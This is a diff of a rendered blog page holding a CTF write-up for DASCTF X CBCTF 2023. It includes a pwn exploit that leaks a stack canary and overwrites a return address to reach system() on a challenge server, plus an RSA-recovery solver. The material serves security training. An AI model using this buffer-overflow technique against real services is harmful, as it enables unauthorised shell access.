class="line"></span><br><span class="line">contextset()</span><br><span class="line"></span><br><span class="line">remo(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28227</span>)</span><br><span class="line"><span class="comment">#proc(&#x27;./GuestBook&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *0x000000000040143C&#x27;)</span></span><br><span class="line">sla(<span class="string">b&#x27;name:&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x17</span>)+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">t1 = ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">pr(t1)</span><br><span class="line">canary0 = ru(<span class="string">b&#x27;How&#x27;</span>)[:-<span class="number">7</span>]</span><br><span class="line">canary = (u64(<span class="string">b&#x27;\x00&#x27;</span>+canary0))</span><br><span class="line">prh(canary)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x00000000004012C3</span></span><br><span class="line">sla(<span class="string">b&#x27;):&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sl(cyclic(<span class="number">0x98</span>)+<span class="string">b&#x27;a&#x27;</span>+canary0+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(system))</span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pr(<span class="built_in">type</span>(canary))</span><br><span class="line">pay = cyclic(<span class="number">0x38</span>)<span class="comment">#+p64(canary)+b&#x27;a&#x27;*8+p64(system)</span></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Excalibur <span class="token keyword">import</span><span class="token operator">*</span>
+
+contextset<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+remo<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28227</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#proc('./GuestBook')</span>
 
 
+<span class="token comment" spellcheck="true">#debug('b *0x000000000040143C')</span>
+sla<span class="token punctuation">(</span>b<span class="token string">'name:'</span><span class="token punctuation">,</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">'b'</span><span class="token punctuation">)</span>
+t1 <span class="token operator">=</span> ru<span class="token punctuation">(</span>b<span class="token string">'\n'</span><span class="token punctuation">)</span>
+pr<span class="token punctuation">(</span>t1<span class="token punctuation">)</span>
+canary0 <span class="token operator">=</span> ru<span class="token punctuation">(</span>b<span class="token string">'How'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">]</span>
+canary <span class="token operator">=</span> <span class="token punctuation">(</span>u64<span class="token punctuation">(</span>b<span class="token string">'\x00'</span><span class="token operator">+</span>canary0<span class="token punctuation">)</span><span class="token punctuation">)</span>
+prh<span class="token punctuation">(</span>canary<span class="token punctuation">)</span>
 
-<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310211839964.png" alt="image-20231021183919918"></p>
-<h1 id="crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="rsa"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>想恢复p,关键在于二次剩余</p>
+system <span class="token operator">=</span> <span class="token number">0x00000000004012C3</span>
+sla<span class="token punctuation">(</span>b<span class="token string">'):'</span><span class="token punctuation">,</span>b<span class="token string">'4'</span><span class="token punctuation">)</span>
+sl<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">0x98</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">'a'</span><span class="token operator">+</span>canary0<span class="token operator">+</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
+sl<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token punctuation">)</span>
+sl<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token punctuation">)</span>
+
+
+pr<span class="token punctuation">(</span>type<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>
+pay <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#+p64(canary)+b'a'*8+p64(system)</span>
+sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
+
+ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310211839964.png" alt="image-20231021183919918"></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>想恢复p,关键在于二次剩余</p>
 <p>加密是一个比特一个比特地加密,恢复时判断是否为二次剩余即可恢复</p>
 <p>对于q就更简单,直接求多项式的gcd即可</p>
 <p>代码如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">124349762993424531697403299350944207725577290992189948388824124986066269514204313888980321088629462472088631052329128042837153718129149149661961926557818023704330462282009415874674794190206220980118413541269327644472633791532767765585035518183177197863522573410860341245613331398610013697803459403446614221369</span></span><br><span class="line"></span><br><span class="line">(e1, noise1, c1) = (<span class="number">1743</span>, <span class="number">44560588075773853612820227436439937514195680734214431948441190347878274184937952381785302837541202705212687700521129385632776241537669208088777729355349833215443048466316517110778502508209433792603420158786772339233397583637570006255153020675167597396958251208681121668808253767520416175569161674463861719776</span>, <span class="number">65643009354198075182587766550521107063140340983433852821580802983736094225036497335607400197479623208915379722646955329855681601551282788854644359967909570360251550766970054185510197999091645907461580987639650262519866292285164258262387411847857812391136042309550813795587776534035784065962779853621152905983</span>)</span><br><span class="line">(e2, noise2, c2) = (<span class="number">1325</span>, <span class="number">35282006599813744140721262875292395887558561517759721467291789696459426702600397172655624765281531167221787036009507833425145071265739486735993631460189629709591456017092661028839951392247601628468621576100035700437892164435424035004463142959219067199451575338270613300215815894328788753564798153516122567683</span>, <span class="number">50327632090778183759544755226710110702046850880299488259739672542025916422119065179822210884622225945376465802069464782311211031263046593145733701591371950349735709553105217501410716570601397725812709771348772095131473415552527749452347866778401205442409443726952960806789526845194216490544108773715759733714</span>)</span><br><span class="line">n2 = <span class="number">103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902098180199167945649526235613636163362672777298968943319216325949503045377100235181706964846408396946496139224344270391027205106691880999410424150216806861393</span></span><br><span class="line">n1 = <span class="number">65634094430927080732256164808833233563732628654160389042977689628512527168256899310662239009610512772020503283842588142453533499954947692968978190310627721338357432052800695091789711809256924541784954080619073213358228083200846540676931341013554634493581962527475555869292091755676130810562421465063412235309</span></span><br><span class="line">str0=<span class="string">&#x27;&#x27;</span><span class="comment">#wp装不下这么长的字符</span></span><br><span class="line"><span class="comment">#legendre_symbol(i,p)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> GCD(b, a % b)</span><br><span class="line"></span><br><span class="line">F.&lt;x&gt;=PolynomialRing(Zmod(n2))</span><br><span class="line">f1=(x+noise1)^e1-c1</span><br><span class="line">f2=(x+noise2)^e2-c2</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(GCD(f1,f2))</span></span><br><span class="line"></span><br><span class="line">q=n2-<span class="number">103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902084990861262304328268863425199809518254496553684067856859306280794877830073274539837451563189724268783548897996668966918676147376205691514341926655798880936</span></span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="built_in">print</span>(q.nbits())</span><br><span class="line"></span><br><span class="line">strlist=str0.split(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"><span class="comment">#print(strlist)</span></span><br><span class="line">intlist=[<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> strlist[:-<span class="number">1</span>]]</span><br><span class="line"><span class="comment">#print(intlist)</span></span><br><span class="line">p=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> intlist:</span><br><span class="line">    <span class="comment">#print(&#x27;test&#x27;+p)</span></span><br><span class="line">    <span class="keyword">if</span> jacobi(i,n1)==<span class="number">1</span>:</span><br><span class="line">        p=<span class="string">&#x27;1&#x27;</span>+p</span><br><span class="line">        <span class="comment">#print(p)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=<span class="string">&#x27;0&#x27;</span>+p</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(p,base=<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">p=<span class="built_in">int</span>(p,base=<span class="number">2</span>)      </span><br><span class="line"><span class="built_in">print</span>(is_prime(p))</span><br><span class="line"><span class="built_in">print</span>(ZZ(p).nbits())</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse_mod(<span class="number">65537</span>,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))))</span><br></pre></td></tr></table></figure>
+<pre class=" language-Python"><code class="language-Python">from gmpy2 import *
+from Crypto.Util.number import *
 
-<h2 id="cb-backpack"><a href="#CB-backpack" class="headerlink" title="CB backpack"></a>CB backpack</h2><p>由于连续六个01串中有3个1，在原始背包格的基础上每连续六列新增一列，限制这个条件，最终LLL即可还原</p>
+c = 124349762993424531697403299350944207725577290992189948388824124986066269514204313888980321088629462472088631052329128042837153718129149149661961926557818023704330462282009415874674794190206220980118413541269327644472633791532767765585035518183177197863522573410860341245613331398610013697803459403446614221369
+
+(e1, noise1, c1) = (1743, 44560588075773853612820227436439937514195680734214431948441190347878274184937952381785302837541202705212687700521129385632776241537669208088777729355349833215443048466316517110778502508209433792603420158786772339233397583637570006255153020675167597396958251208681121668808253767520416175569161674463861719776, 65643009354198075182587766550521107063140340983433852821580802983736094225036497335607400197479623208915379722646955329855681601551282788854644359967909570360251550766970054185510197999091645907461580987639650262519866292285164258262387411847857812391136042309550813795587776534035784065962779853621152905983)
+(e2, noise2, c2) = (1325, 35282006599813744140721262875292395887558561517759721467291789696459426702600397172655624765281531167221787036009507833425145071265739486735993631460189629709591456017092661028839951392247601628468621576100035700437892164435424035004463142959219067199451575338270613300215815894328788753564798153516122567683, 50327632090778183759544755226710110702046850880299488259739672542025916422119065179822210884622225945376465802069464782311211031263046593145733701591371950349735709553105217501410716570601397725812709771348772095131473415552527749452347866778401205442409443726952960806789526845194216490544108773715759733714)
+n2 = 103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902098180199167945649526235613636163362672777298968943319216325949503045377100235181706964846408396946496139224344270391027205106691880999410424150216806861393
+n1 = 65634094430927080732256164808833233563732628654160389042977689628512527168256899310662239009610512772020503283842588142453533499954947692968978190310627721338357432052800695091789711809256924541784954080619073213358228083200846540676931341013554634493581962527475555869292091755676130810562421465063412235309
+str0=''#wp装不下这么长的字符
+#legendre_symbol(i,p)
+
+def GCD(a, b):
+    if(b == 0):
+        return a.monic()        
+    else:
+        return GCD(b, a % b)
+
+F.<x>=PolynomialRing(Zmod(n2))
+f1=(x+noise1)^e1-c1
+f2=(x+noise2)^e2-c2
+
+#print(GCD(f1,f2))
+
+q=n2-103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902084990861262304328268863425199809518254496553684067856859306280794877830073274539837451563189724268783548897996668966918676147376205691514341926655798880936
+print(q)
+print(q.nbits())
+
+strlist=str0.split('n')
+#print(strlist)
+intlist=[int(i) for i in strlist[:-1]]
+#print(intlist)
+p=''
+for i in intlist:
+    #print('test'+p)
+    if jacobi(i,n1)==1:
+        p='1'+p
+        #print(p)
+    else:
+        p='0'+p
+print(p)
+print(int(p,base=2))
+
+p=int(p,base=2)      
+print(is_prime(p))
+print(ZZ(p).nbits())
+n=p*q
+phi=(p-1)*(q-1)
+d=inverse_mod(65537,phi)
+print(long_to_bytes(int(pow(c,d,n))))
+</code></pre>
+<h2 id="CB-backpack"><a href="#CB-backpack" class="headerlink" title="CB backpack"></a>CB backpack</h2><p>由于连续六个01串中有3个1，在原始背包格的基础上每连续六列新增一列，限制这个条件，最终LLL即可还原</p>
 <p><del>脚本丢了XD</del></p>
 
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">lmarch2</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://lmarch2.github.io/posts/ec1aa757/">http://lmarch2.github.io/posts/ec1aa757/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">lmarch2</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/ctf/">
+                                    <span class="chip bg-color">ctf</span>
+                                </a>
+                            
+                                <a href="/tags/DASCTF/">
+                                    <span class="chip bg-color">DASCTF</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
     </div>
 
     
-    
+
     
 
-<div> 
-	 
-		<div>
     
-        <div style="text-align:center;color: #ccc;font-size:14px;">-------------文章就到这里啦！<i class="fa fa-paw"></i>感谢您的阅读XD-------------</div>
+
     
-</div> 
-	 
+
+    
+
+    
+        <style>
+    .waline-card {
+        margin: 1.5rem auto;
+    }
+    .waline-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #waline p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+    #waline blockquote p {
+        text-indent: 0.2rem;
+    }
+    #waline a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+    #waline img {
+        max-width: 100%;
+        cursor: pointer;
+    }
+    #waline ol li {
+        list-style-type: decimal;
+    }
+    #waline ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+    #waline ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+    #waline ul li {
+        list-style-type: disc;
+    }
+    #waline ul ul li {
+        list-style-type: circle;
+    }
+    #waline table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+    #waline table, th, td {
+        border: 0;
+    }
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+    #waline table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+    #waline table td {
+        min-width: 80px;
+    }
+    #waline h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+    #waline h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+    #waline h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+    #waline h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+    #waline h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+    #waline h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+    #waline p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+    #waline hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+    #waline blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+    #waline pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+    #waline code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+    #waline pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+    #waline pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+    #waline code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+    #waline [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+    #waline b,
+    strong {
+        font-weight: bold;
+    }
+    #waline dfn {
+        font-style: italic;
+    }
+    #waline small {
+        font-size: 85%;
+    }
+    #waline cite {
+        font-style: normal;
+    }
+    #waline mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+    #waline table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+    #waline table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+    #waline table td {
+        min-width: 80px;
+    }
+    #waline [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+  </style>
+  
+  <div class="card waline-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="waline" class="card-content" style="display: grid">
+    </div>
+  </div>
+  
+
+  <!-- <script src="//cdn.jsdelivr.net/npm/@waline/client"></script> -->
+  <script src="/libs/waline/Waline.min.js"></script>
+  <script>
+    new Waline({
+        el: '#waline',
+        serverURL: 'https://waline-blog-flax-two.vercel.app',
+        avatar: 'mm'    
+    });
+  </script> 
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/posts/2611e12a/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="HASHTEAM2024香山杯WP">
+                        
+                        <span class="card-title">HASHTEAM2024香山杯WP</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-10-27
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/HASHTEAM-wp/" class="post-category">
+                                    HASHTEAM'wp
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%9D%AF%E5%AD%90/">
+                        <span class="chip bg-color">杯子</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/4b18615c/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="NSSCTF 2nd wp">
+                        
+                        <span class="card-title">NSSCTF 2nd wp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-30
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/wp/" class="post-category">
+                                    wp
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/NSSCTF/">
+                        <span class="chip bg-color">NSSCTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
 </div>
 
-    <footer class="post-footer">
-          
 
-<div class="post-copyright">
-<ul>
-  <li class="post-copyright-author">
-      <strong>本文作者： </strong>lmarch2
-  </li>
-  <li class="post-copyright-link">
-      <strong>本文链接：</strong>
-      <a href="http://lmarch2.github.com/posts/ec1aa757/" title="DASCTF X CBCTF 2023 WP">http://lmarch2.github.com/posts/ec1aa757/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
-  </li>
-</ul>
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: lmarch2&#39;blog<br />'
+            + '文章作者: lmarch2<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
 </div>
 
-          <div class="post-tags">
+<!-- TOC 悬浮按钮. -->
 
- <div class="post-tags">
-              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
-          </div>
-          <script type="text/javascript">
-            var tagsall=document.getElementsByClassName("post-tags")
-            for (var i = tagsall.length - 1; i >= 0; i--){
-                var tags=tagsall[i].getElementsByTagName("a");
-                for (var j = tags.length - 1; j >= 0; j--) {
-                    var golden_ratio = 0.618033988749895;
-                    var s = 0.5;
-                    var v = 0.999;
-                    var h = golden_ratio + Math.random()*0.8 - 0.5;
-                    var h_i = parseInt(h * 6);
-                    var f = h * 6 - h_i;
-                    var p = v * (1 - s);
-                    var q = v * (1 - f * s);
-                    var t = v * (1 - (1 - f) * s);
-                    var r, g, b;
-                    switch (h_i) {
-                        case 0:
-                            r = v;
-                            g = t;
-                            b = p;
-                            break;
-                        case 1:
-                            r = q;
-                            g = v;
-                            b = p;
-                            break;
-                        case 2:
-                            r = p;
-                            g = v;
-                            b = t;
-                            break;
-                        case 3 :
-                            r = p;
-                            g = q;
-                            b = v;
-                            break;
-                        case 4:
-                            r = t;
-                            g = p;
-                            b = v;
-                            break;
-                        case 5:
-                            r = v;
-                            g = p;
-                            b = q;
-                            break;
-                        default:
-                            r = 1;
-                            g = 1;
-                            b = 1;
-                      }
-                    tags[j].style.background = "rgba("+parseInt(r*255)+","+parseInt(g*255)+","+parseInt(b*255)+","+0.5+")";
-                }
-            }                        
-            </script>
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
 
 
-              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
-          </div>
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
 
         
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
 
-          <div class="post-nav">
-            <div class="post-nav-item">
